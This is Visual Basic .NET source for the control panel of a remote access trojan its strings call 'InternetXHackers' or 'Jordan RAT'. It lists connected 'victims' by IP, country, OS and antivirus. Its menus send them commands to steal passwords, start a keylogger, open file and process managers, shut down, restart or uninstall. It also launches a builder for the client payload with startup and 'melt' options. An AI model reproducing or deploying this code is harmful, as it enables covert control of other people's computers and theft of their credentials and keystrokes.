Imports System.IO
Public Class Form1
    Private lvwColumnSorter As ListViewColumnSorter
    Public WithEvents S As SocketServer
    Public Yy As String = "|HACXXCODER|"
    Public Sz As Size
    Public pw As String = "IRAQ"
    Function QZ(ByVal q As Integer) As Size '  Lower Size of image
        Dim zs As New Size(Sz)
        Select Case q
            Case 0
                Return Sz
            Case 1
                zs.Width = zs.Width / 1.1
                zs.Height = zs.Height / 1.1
            Case 2
                zs.Width = zs.Width / 1.3
                zs.Height = zs.Height / 1.3
            Case 3
                zs.Width = zs.Width / 1.5
                zs.Height = zs.Height / 1.5
            Case 4
                zs.Width = zs.Width / 1.9
                zs.Height = zs.Height / 1.9
            Case 5
                zs.Width = zs.Width / 2
                zs.Height = zs.Height / 2
            Case 6
                zs.Width = zs.Width / 2.1
                zs.Height = zs.Height / 2.1
            Case 7
                zs.Width = zs.Width / 2.2
                zs.Height = zs.Height / 2.2
            Case 8
                zs.Width = zs.Width / 2.5
                zs.Height = zs.Height / 2.5
            Case 9
                zs.Width = zs.Width / 3
                zs.Height = zs.Height / 3
            Case 10
                zs.Width = zs.Width / 3.5
                zs.Height = zs.Height / 3.5
            Case 11
                zs.Width = zs.Width / 4
                zs.Height = zs.Height / 4
            Case 12
                zs.Width = zs.Width / 5
                zs.Height = zs.Height / 5
            Case 13
                zs.Width = zs.Width / 6
                zs.Height = zs.Height / 6
        End Select
        zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
        zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
        Return zs
    End Function
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        End
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        ListView1.Items.Add(String.Concat(New String() {"[", (DateAndTime.TimeOfDay), "]  &  [ >>>>>>  InternetXHackers Started  ]   "}))

        Port.Show()

        Control.CheckForIllegalCrossThreadCalls = False


        Timer1.Start()
        NotifyIcon1.Icon = Me.Icon
        S = New SocketServer
        Try
            Dim aa As String() = Split(File.ReadAllText(Application.StartupPath & "\Settings.ini"), "|")
            If aa(0) = "true" Then


                S.Start(aa(1))
                ToolStripLabel1.Text = "Port : " & aa(1)
            End If

        Catch : End Try
    End Sub
#Region "Server Events"
    Sub Disconnect(ByVal sock As Integer) Handles S.DisConnected
        Try
            L1.Items(sock.ToString).Remove()
            ListView1.Items.Add(String.Concat(New String() {"[", (DateAndTime.TimeOfDay), "]  &  [ >>>>>>  Disconnected IP : ", Me.S.IP(sock), " ]"}))

        Catch ex As Exception
        End Try


    End Sub
    Sub Connected(ByVal sock As Integer) Handles S.Connected

        S.Send(sock, "info" & Yy & pw) ' i ask him to send me PC name


    End Sub
    Delegate Sub _Datad(ByVal info As Data)
    Sub data(ByVal info As Data) Handles S.Datad
        Dim a As String = info.GetData
        Dim aa As String() = a.Split("|")
        Select Case aa(0)
            Case "tt"
                MsgBox("hhhhhhhhhhhhhhhhhhhhhhhh")
        End Select

    End Sub
    Delegate Sub _Data(ByVal sock As Integer, ByVal B As Byte())
    Sub Data(ByVal sock As Integer, ByVal B As Byte()) Handles S.Data
        Dim T As String = BS(B)
        Dim A As String() = Split(T, Yy)
        Try
            Select Case A(0)
                Case "info" ' Client Sent me PC name

                    Dim L = L1.Items.Add(sock.ToString, A(1), GetCountryNumber(UCase(A(3))))
                    L.SubItems.Add(S.IP(sock))
                    L.SubItems.Add(A(2))
                    L.SubItems.Add(A(3))
                    L.SubItems.Add(A(4))
                    L.SubItems.Add(A(5))
                    L.SubItems.Add(" ")

                    L.ToolTipText = sock
                    ListView1.Items.Add(String.Concat(New String() {"[", (DateAndTime.TimeOfDay), "]  &  [ >>>>>>  Connected IP : ", Me.S.IP(sock), " ]"}))

                    NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
                    NotifyIcon1.BalloonTipTitle = "Jordan RAT"
                    NotifyIcon1.BalloonTipText = "New Server [ ID : " & A(1) & " IP : " & S.IP(sock) & " Country : " & A(3) & " ]"
                    NotifyIcon1.ShowBalloonTip(1)

                Case "AW"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).SubItems(6).Text = A(1)
                            Exit For
                        End If
                    Next
                Case "F"
                    For i As Integer = 0 To L1.Items.Count - 1
                        If L1.Items.Item(i).SubItems(1).Text = S.IP(sock) Then
                            L1.Items.Item(i).ForeColor = Color.Black
                            Exit For
                        End If
                    Next
            End Select
        Catch ex As Exception
        End Try




    End Sub
#End Region


    Private Sub L1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub






    Private Sub DesktopToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub CloseToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CloseToolStripMenuItem1.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "close")
        Next
    End Sub

    Private Sub L1_ColumnClick(ByVal sender As Object, ByVal e As System.Windows.Forms.ColumnClickEventArgs)
        ' Determine if the clicked column is already the column that is 
        ' being sorted.
        Try


            If (e.Column = lvwColumnSorter.SortColumn) Then
                ' Reverse the current sort direction for this column.
                If (lvwColumnSorter.Order = SortOrder.Ascending) Then
                    lvwColumnSorter.Order = SortOrder.Descending
                Else
                    lvwColumnSorter.Order = SortOrder.Ascending
                End If
            Else
                ' Set the column number that is to be sorted; default to ascending.
                lvwColumnSorter.SortColumn = e.Column
                lvwColumnSorter.Order = SortOrder.Ascending
            End If

            ' Perform the sort with these new sort options.
            Me.L1.Sort()
        Catch ex As Exception

        End Try
    End Sub

    Private Sub L1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub L1_SelectedIndexChanged_1(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub RemoteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "!")
        Next
    End Sub

    Private Sub RemoteChaatToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub ToolStripStatusLabel1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub LogoffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Logoff")
        Next
    End Sub

    Private Sub RestartToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Restart")
        Next
    End Sub

    Private Sub ShutdownToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Shutdown")
        Next
    End Sub

    Private Sub RemoteFileMangerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "|||") ' file manger
        Next
    End Sub




    Private Sub ProcessManagerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "||||") ' process 
        Next
    End Sub

    Private Sub FindPasswordToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "++")
        Next
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Me.Text = "InternetXHackers -RAT Coded By HacxXcoder Version one Collect Victims - Selected [(] Total [ = ]".Replace("=", L1.Items.Count).Replace("(", L1.SelectedItems.Count)

    End Sub





    Private Sub Form1_Resize(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Resize
        If WindowState = FormWindowState.Minimized Then
            ShowIcon = False
            ShowInTaskbar = False
            Me.Hide()
            NotifyIcon1.BalloonTipIcon = ToolTipIcon.Info
            NotifyIcon1.BalloonTipTitle = "Jordan RAT"
            NotifyIcon1.BalloonTipText = "Server online [x]".Replace("x", L1.Items.Count)
            NotifyIcon1.ShowBalloonTip(1000)
        Else

        End If
    End Sub

    Private Sub SdfghToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SdfghToolStripMenuItem.Click
        ShowIcon = True
        ShowInTaskbar = True
        Me.Show()
    End Sub

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        End
    End Sub

    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "Uninstall")
        Next
    End Sub

    Private Sub CreatServerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Builder.Show()
    End Sub

    Private Sub AboutToolStripMenuItem_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub FfffffffToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub
    Public Sub PktToImage(ByVal BY As Byte())

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Try

            Port.ShowDialog()
        Catch ex As Exception

        End Try
    End Sub

    Private Sub L1_SelectedIndexChanged_2(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub L1_SelectedIndexChanged_3(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        Builder.Show()
    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        ' Form6.Show()
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "tt")
        Next
    End Sub

    Private Sub RemoteKayloggerToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "openlo")
        Next
    End Sub

    Private Sub TextToSpechToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "opentto")
        Next
    End Sub

    Private Sub FunToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        For Each x As ListViewItem In L1.SelectedItems
            S.Send(x.ToolTipText, "fun")
        Next
    End Sub

    Private Sub DownloadAndExecuteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub GroupBox2_Enter(sender As Object, e As EventArgs)

    End Sub

    Private Sub lbl1_Click(sender As Object, e As EventArgs)
        Port.Show()
    End Sub

    Private Sub ToolStripLabel1_Click(sender As Object, e As EventArgs) Handles ToolStripLabel1.Click

    End Sub

    Private Sub ToolStripLabel2_Click(sender As Object, e As EventArgs) Handles ToolStripLabel2.Click
        Builder.Show()
    End Sub

    Private Sub ToolStripLabel3_Click(sender As Object, e As EventArgs)
        Port.Show()
    End Sub

    Private Sub ToolStripButton1_Click(sender As Object, e As EventArgs) Handles ToolStripButton1.Click
        ColumnHeader1.Text = "البلد"
        ColumnHeader2.Text = "الاي بي"
        ColumnHeader3.Text = "عنوان السيرفر"
        ColumnHeader4.Text = "الحاسوب/الاسم"
        ColumnHeader6.Text = "النظام"
        ColumnHeader7.Text = "مظادات الفايروس"
        ToolStripLabel2.Text = "[ تكوين الخادم ]"
        CloseToolStripMenuItem.Text = "الخادم"
        CloseToolStripMenuItem1.Text = "غلق"
        UninstallToolStripMenuItem.Text = "حذف"
        Builder.Text = "صنع خادم"
        Port.Text = "اعدادات البورت"
        Port.CheckBox3.Text = "استماع تلقائيا"
        Port.Button3.Text = "حفظ"
        Builder.Label1.Text = "الاي بي"
        Builder.Label5.Text = "عنوان السيرفر"
        Builder.Label7.Text = "كلمة السر"
        Builder.Label2.Text = "المنفذ"
        Builder.CheckBox2.Text = "بدء التشغيل"
        Builder.CheckBox3.Text = "ذوبان "
        Builder.Button1.Text = "تكوين "

    End Sub

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click

    End Sub

    Private Sub ToolStripButton2_Click(sender As Object, e As EventArgs) Handles ToolStripButton2.Click
        ColumnHeader1.Text = "país"
        ColumnHeader2.Text = "Endereço de IP"
        ColumnHeader3.Text = "ID servidor"
        ColumnHeader4.Text = "Computador / Nome"
        ColumnHeader6.Text = "sistema operacional"
        ColumnHeader7.Text = "antivírus"
        ToolStripLabel2.Text = "[ Servidor de Construção ]"
        CloseToolStripMenuItem.Text = "servidor"
        CloseToolStripMenuItem1.Text = "Fechar"
        UninstallToolStripMenuItem.Text = "Desinstalar"
        Builder.Text = " Servidor de Construção"
        Port.Text = "Configurações de porta"
        Port.CheckBox3.Text = "auto ouvir"
        Port.Button3.Text = "salvar"
        Builder.Label1.Text = "IP"
        Builder.Label5.Text = "SERVIDOR ID"
        Builder.Label7.Text = "senha"
        Builder.Label2.Text = "Porta"
        Builder.CheckBox2.Text = "Startup"
        Builder.CheckBox3.Text = "Fundição "
        Builder.Button1.Text = "construir "

    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListView1.SelectedIndexChanged

    End Sub

    Private Sub ToolStripLabel3_Click_1(sender As Object, e As EventArgs)
        About2.Show()
    End Sub

    Private Sub ToolStripLabel3_Click_2(sender As Object, e As EventArgs) Handles ToolStripLabel3.Click
        About2.Show()
    End Sub

    Private Sub CheckForUpdateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CheckForUpdateToolStripMenuItem.Click
        Process.Start("http://hacxxcoder.blogspot.com/")
    End Sub
End Class
